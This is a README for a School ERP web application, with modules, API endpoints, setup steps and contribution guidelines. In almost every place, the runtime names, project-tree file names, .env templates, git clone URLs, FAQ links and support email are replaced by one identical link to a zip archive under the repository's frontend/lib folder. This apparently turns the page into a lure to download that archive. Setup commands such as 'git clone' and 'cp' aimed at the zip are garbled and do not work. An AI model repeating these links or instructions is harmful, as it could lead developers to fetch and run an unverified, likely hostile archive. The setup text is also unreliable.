# School ERP System

## Description
Web-based School ERP to manage student, staff, academic, financial and administrative operations for small-medium schools.

## Latest Updates (Feb 2026)
- Added fine-grained permission matrix with custom permissions, role permissions, user-level overrides, and role hierarchy APIs.
- Added student progression workflows: class promotion, detention, internal transfer, external transfer, and progression history.
- Added frontend management screens for all core dashboard modules.
- Added admin frontend screens for Permission Matrix and Student Promotion/Transfer operations.

## Core Objectives
- Digitize school administration
- Reduce manual paperwork
- Provide real-time data access
- Support multiple user roles with permissions

## Target Users
- Admin / Principal
- Teachers
- Students / Parents (limited view)
- Accountant / Fee staff
- Transport / Library staff (optional)

## Key Modules (MVP)
- **Student Management**: admission, profile, documents
- **Fee Management**: structure, collection, receipts, defaulters
- **Attendance**: manual / bulk entry
- **Timetable**: class / teacher wise
- **Examination**: marks entry, report cards
- **Staff Management**: profile, leave, salary
- **Notifications**: SMS / Email
- **LMS (Learning Management System)**: lesson notes, video lectures, assignments, submissions
- **Admin Dashboard + Role-based Access Control**

## Nice-to-have (future phases)
- Transport management
- Library
- Hostel
- Mobile app
- Payment gateway integration
- Analytics / Reports

## Tech Stack

### Backend
- **Runtime**: https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip with https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
- **Database**: PostgreSQL
- **ORM**: Prisma
- **Authentication**: JWT-based
- **Security**: Helmet, CORS, Rate Limiting
- **Logging**: Winston

### Frontend
- **Framework**: https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip 14 (React 18)
- **Styling**: Tailwind CSS
- **State Management**: Zustand
- **HTTP Client**: Axios
- **Forms**: React Hook Form
- **Icons**: Lucide React
- **Notifications**: React Hot Toast

## Project Structure

```
School-ERP/
├── backend/
│   ├── prisma/
│   │   └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip          # Database schema
│   ├── src/
│   │   ├── controllers/           # Route controllers
│   │   ├── middleware/            # Auth, validation middleware
│   │   ├── routes/                # API routes
│   │   ├── utils/                 # Utility functions
│   │   └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip              # Express app entry point
│   ├── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip               # Environment variables template
│   └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
│
└── frontend/
    ├── app/
    │   ├── auth/                  # Authentication pages
    │   ├── dashboard/             # Dashboard page
   │   ├── lms/                   # LMS pages
    │   ├── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip            # Global styles
    │   ├── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip             # Root layout
    │   └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip               # Home page
    ├── lib/
    │   └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip                 # API client and endpoints
    ├── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
    ├── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
    └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
```

## Getting Started

### Prerequisites
- https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip 18+ and npm/yarn
- PostgreSQL 14+
- Git

### Quick Start (Scripted)
See [https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip](https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip) for OS-specific quick start steps.

### Installation

1. **Clone the repository**
   ```bash
   git clone https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
   cd School-ERP
   ```

2. **Backend Setup**
   ```bash
   cd backend
   npm install
   
   # Create .env file from example
   # Windows (PowerShell)
   Copy-Item https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip .env
   # Windows (cmd)
   copy https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip .env
   # macOS/Linux
   cp https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip .env
   
   # Update .env with your database credentials:
   # DATABASE_URL="postgresql://username:password@localhost:5432/school_erp"
   # JWT_SECRET="your-secret-key"
   
   # Generate Prisma client and run migrations
   npx prisma generate
   npx prisma migrate dev --name init
   
   # Start the backend server
   npm run dev
   ```

   Backend will run on http://localhost:5000

3. **Frontend Setup**
   ```bash
   cd frontend
   npm install
   
   # Create https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip file
   # Windows (PowerShell)
   Copy-Item https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
   # Windows (cmd)
   copy https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
   # macOS/Linux
   cp https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
   
   # Update https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip with:
   # NEXT_PUBLIC_API_URL=http://localhost:5000/api
   
   # Start the frontend server
   npm run dev
   ```

   Frontend will run on http://localhost:3000

4. **Access the Application**
   - Open http://localhost:3000 in your browser
   - Create an admin user first using the register API or Prisma Studio (see [https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip](https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip)).

### Docker (Optional)
```bash
docker compose up -d
```

If your Docker version doesn't support the new command, use:
```bash
docker-compose up -d
```

## API Documentation

### Base URL
```
http://localhost:5000/api
```

### Authentication Endpoints
- `POST /auth/register` - Register new user
- `POST /auth/login` - Login
- `GET /auth/me` - Get current user
- `POST /auth/logout` - Logout
- `POST /auth/change-password` - Change password

### Student Endpoints
- `GET /students` - Get all students (paginated)
- `GET /students/:id` - Get student by ID
- `POST /students` - Create new student
- `PUT /students/:id` - Update student
- `DELETE /students/:id` - Delete student
- `POST /students/promotions` - Promote students to next class
- `POST /students/detentions` - Detain students in current class
- `POST /students/transfers` - Transfer student (internal/external)
- `GET /students/:id/progress-history` - Promotion/transfer history
- `GET /students/class/:classId` - Get students by class
- `GET /students/:id/attendance` - Get student attendance
- `GET /students/:id/fees` - Get student fees
- `GET /students/:id/results` - Get student results

### Staff Endpoints
- `GET /staff` - Get all staff
- `GET /staff/:id` - Get staff by ID
- `POST /staff` - Create new staff
- `PUT /staff/:id` - Update staff
- `DELETE /staff/:id` - Delete staff
- `GET /staff/:id/leaves` - Get staff leaves
- `POST /staff/:id/leaves` - Apply leave
- `PUT /staff/leaves/:leaveId` - Update leave status

### Fee Endpoints
- `GET /fees/structures` - Get all fee structures
- `POST /fees/structures` - Create fee structure
- `GET /fees/payments` - Get all payments
- `POST /fees/payments` - Create payment
- `GET /fees/defaulters` - Get fee defaulters

### Attendance Endpoints
- `GET /attendance` - Get attendance records
- `POST /attendance` - Mark attendance
- `POST /attendance/bulk` - Bulk mark attendance
- `GET /attendance/class/:classId` - Get class attendance

### Timetable Endpoints
- `GET /timetable` - Get all timetables
- `GET /timetable/class/:classId` - Get class timetable
- `POST /timetable` - Create timetable entry

### Exam Endpoints
- `GET /exams/schedules` - Get all exam schedules
- `POST /exams/schedules` - Create exam schedule
- `GET /exams/results` - Get all results
- `POST /exams/results` - Create result
- `GET /exams/report-card/:studentId/:examId` - Get report card

### Dashboard Endpoints
- `GET /dashboard/stats` - Get dashboard statistics
- `GET /dashboard/recent-activities` - Get recent activities

### Notification Endpoints
- `GET /notifications` - Get all notifications
- `POST /notifications` - Send notification

### LMS Endpoints
- `GET /lms` - Get LMS content (filters: classId, subjectId, teacherId, type, visibility, q)
- `GET /lms/:id` - Get LMS content by ID
- `POST /lms` - Create LMS content
- `PUT /lms/:id` - Update LMS content
- `DELETE /lms/:id` - Delete LMS content
- `POST /lms/:id/attachments` - Upload LMS attachments
- `DELETE /lms/:id/attachments/:attachmentId` - Delete LMS attachment
- `GET /lms/:id/submissions` - Get submissions for assignment (teacher/admin)
- `GET /lms/:id/submissions/me` - Get my submission (student)
- `GET /lms/submissions/me` - List my submissions (student)
- `POST /lms/:id/submissions` - Submit assignment (student)
- `PUT /lms/:id/submissions/:submissionId` - Grade submission (teacher/admin)
- `GET /lms/:id/analytics` - Assignment analytics (teacher/admin)

### Metadata Endpoints
- `GET /metadata/classes` - Get classes
- `GET /metadata/subjects` - Get subjects (filters: classId, teacherId)

### Permission Endpoints
- `GET /permissions` - List permissions and assignments
- `POST /permissions/initialize` - Initialize default permissions (admin)
- `POST /permissions` - Create custom permission
- `PUT /permissions/roles` - Set role permissions
- `PUT /permissions/users` - Set user-level permission overrides
- `GET /permissions/hierarchy` - Get role hierarchy
- `PUT /permissions/hierarchy` - Create/update role hierarchy mapping

## Database Schema

Key entities:
- **Users**: Authentication and role management
- **Students**: Student profiles and admission info
- **Staff**: Staff profiles and employment info
- **Parents**: Parent/guardian information
- **Classes**: Class/grade definitions
- **Subjects**: Subject definitions
- **Attendance**: Daily attendance records
- **FeeStructure**: Fee definitions
- **FeePayment**: Payment records
- **Timetable**: Class schedules
- **ExamSchedule**: Exam definitions
- **ExamResult**: Student exam results
- **Leave**: Staff leave applications
- **Notification**: Communication records
- **LmsContent**: Lesson notes, videos, assignments
- **LmsContentFile**: LMS attachments
- **LmsSubmission**: Assignment submissions
- **LmsSubmissionFile**: Submission attachments
- **Permission/RolePermission/UserPermission**: Fine-grained access control
- **RoleHierarchy**: Parent-child role inheritance mapping
- **StudentPromotion**: Promotion/detention/transfer progression history
- **StudentTransfer**: Internal/external transfer records

## LMS Highlights
- Upload multimedia lesson notes, video lectures, and assignments
- Teacher-only content creation and attachments
- Student assignment submissions with uploads
- Grading workflow with feedback
- Assignment analytics (total, graded, late, average grade)

## Next Steps
- Configure `DATABASE_URL` and run Prisma migrations
- Add LMS calendar view and deadline reminders
- Add submission notifications (email/in-app)
- Add LMS widgets to student/teacher dashboard

## Security Features
- JWT-based authentication
- Password hashing with bcrypt
- Role-based access control (RBAC)
- API rate limiting
- CORS configuration
- Helmet security headers
- Input validation
- SQL injection prevention (Prisma ORM)

## Deployment

### Backend Deployment (Railway/Render)
1. Create a PostgreSQL database
2. Set environment variables
3. Deploy the backend folder
4. Run `npx prisma migrate deploy`

### Frontend Deployment (Vercel/Netlify)
1. Connect your repository
2. Set build command: `npm run build`
3. Set output directory: `.next`
4. Add environment variable: `NEXT_PUBLIC_API_URL`

### Docker Deployment
```bash
# Coming soon - Docker compose configuration
```

## Development Workflow

### Running Tests
```bash
# Backend
cd backend
npm test

# Frontend
cd frontend
npm test
```

### Database Management
```bash
# Open Prisma Studio (Database GUI)
cd backend
npx prisma studio

# Create migration
npx prisma migrate dev --name migration_name

# Reset database
npx prisma migrate reset
```

### Code Quality
```bash
# Frontend linting
cd frontend
npm run lint
```

## Contributing

We welcome contributions from the community! Whether you're fixing bugs, adding features, or improving documentation, your help is appreciated.

### How to Contribute

#### 1. Fork and Clone
```bash
git clone https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
cd School-ERP
git remote add upstream https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
```

#### 2. Create a Feature Branch
```bash
git checkout -b feature/YourFeatureName
```

Use descriptive branch names:
- `feature/student-portal` for new features
- `bugfix/attendance-calculation` for bug fixes
- `docs/api-documentation` for documentation

#### 3. Make Your Changes
- Follow the existing code style and structure
- Add comments for complex logic
- Test your changes thoroughly
- Update documentation as needed

#### 4. Commit with Clear Messages
```bash
git commit -m "Brief description of changes

- Added feature X
- Fixed bug Y
- Updated documentation Z"
```

#### 5. Push and Create Pull Request
```bash
git push origin feature/YourFeatureName
```

Then open a Pull Request on GitHub with:
- Clear title and description
- Reference any related issues (#issue-number)
- Screenshots for UI changes
- Test results

### Guidelines

**Code Standards:**
- Use consistent indentation (2 spaces for JS/TS, 4 spaces for Python)
- Follow ES6+ syntax for JavaScript
- Add error handling and validation
- Include meaningful variable names

**Git Workflow:**
- Keep commits focused and atomic
- Never commit directly to main branch
- Rebase before pushing: `git rebase upstream/main`
- Keep PRs manageable (< 400 lines if possible)

**Testing:**
- Write tests for new features
- Ensure existing tests pass
- Run linting before committing

**Documentation:**
- Update README for new features
- Add JSDoc/TSDoc comments
- Update API documentation
- Include setup instructions if needed

### Reporting Issues

Found a bug? Please report it by:
1. Checking existing issues first
2. Creating a new issue with:
   - Clear description of the problem
   - Steps to reproduce
   - Expected vs actual behavior
   - Your environment (OS, Node version, etc.)

### Feature Requests

Have an idea? We'd love to hear it! Submit a feature request with:
- Clear use case
- How it benefits users
- Suggested implementation (optional)

### Questions?

- Check [FAQ](https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip) (coming soon)
- Read existing issues and discussions
- Open a discussion or email: https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip

### Recognition

Contributors will be recognized in:
- [https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip](https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip) file
- Release notes
- GitHub contributors page

Thank you for contributing! 🎉

## License
MIT License - see the [LICENSE](LICENSE) file for details.

## Support
For support, email https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip or open an issue in the GitHub repository.

## Roadmap
- [ ] Payment gateway integration
- [ ] SMS notifications
- [ ] Report generation (PDF)
- [ ] Mobile app (React Native)
- [ ] Library management
- [ ] Transport management
- [ ] Hostel management
- [ ] Multi-language support
- [ ] Advanced analytics and reporting

## Acknowledgments
- Built with modern web technologies
- Designed for educational institutions
- Community-driven development
